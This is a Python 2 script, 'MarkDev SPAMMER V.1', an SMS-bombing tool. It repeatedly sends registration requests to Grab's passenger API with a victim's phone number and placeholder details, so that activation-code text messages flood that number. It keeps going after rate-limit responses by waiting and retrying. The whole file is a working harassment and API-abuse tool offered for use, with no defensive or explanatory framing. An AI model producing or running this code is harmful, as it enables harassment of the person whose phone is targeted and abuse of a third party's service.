#!/usr/bin/python

import requests
import datetime
import sys
import time
import argparse

print """\
   ____                             
  / __/__  ___ ___ _  __ _  ___ ____
 _\ \/ _ \/ _ `/  ' \/  ' \/ -_) __/
/___/ .__/\_,_/_/_/_/_/_/_/\__/_/   
   /_/  MarkDev SPAMMER V.1
"""	
parser = argparse.ArgumentParser(prog="spammer", description="Spammer Is a Tool Used to Send Grab Activation Code (SMS) To a Phone Number Repeatedly. Spammer Uses Grab's Passenger API.", epilog="Mail: sc-school@hotmail.com")
parser.add_argument("phonenum", metavar="Phone", help="The Phone Number To Send The GAC SMS. (Example: 6285237048641)")
parser.add_argument('--delay', metavar="30-60", help='The Delay Time (Wait Time) in Seconds (Default: 60)')
args = parser.parse_args()

def showstatus(message, type="new"):
	now = datetime.datetime.now().strftime("%H:%M:%S")
	icon = "*"
	if type == "warn":
		icon = "!"
	elif type == "new":
		icon == "*"
	message = "[" + icon + "][" + now + "]" + message
	return message
delaytime = 60
if args.delay:
	delaytime = int(args.delay)
	
def wrapsbrace(string, endspace=False):
	if endspace == True:
		return "[" + string + "] "
	else:
		return "[" + string + "]"
def sleep(x):
	try:
		time.sleep(x)
	except KeyboardInterrupt:
		print "\r" + showstatus(wrapsbrace("except", True) + "KeyboardInterrupt Thrown! Exiting . . .", "warn")
		exit()

_phone = args.phonenum
iteration = 1
print showstatus(wrapsbrace("info", True) + "SEND SMS TO: {}".format(_phone))
while True:
	try:
		r = requests.post("https://p.grabtaxi.com/api/passenger/v2/profiles/register", data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36'})
	except KeyboardInterrupt:
		print "\r" + showstatus(wrapsbrace("except", True) + "KeyboardInterrupt Thrown! Exiting . . .", "warn")
		exit()
	except requests.exceptions.ConnectionError:
		print showstatus(wrapsbrace("except", True) + "ConnectionError thrown! Sleeping for {}s . . .".format(delaytime), "warn")
		sleep(delaytime)
	else:
		if r.status_code == 429:
			print showstatus(wrapsbrace("429 {}".format(r.reason), True) + "Sleeping For {}s . . .".format(delaytime), "warn")
			sleep(delaytime)
		elif r.status_code == 200:
			print showstatus(wrapsbrace("200 OK", True) + "SMS Sent! Sleeping For {}s . . . (iteration:{})".format(delaytime,iteration))
			iteration += 1
			sleep(delaytime)
		else:
			print showstatus(wrapsbrace("{} {}".format(r.status_code, r.reason), True) + "Something Went Wrong. Exiting . . .", "warn")
			exit()
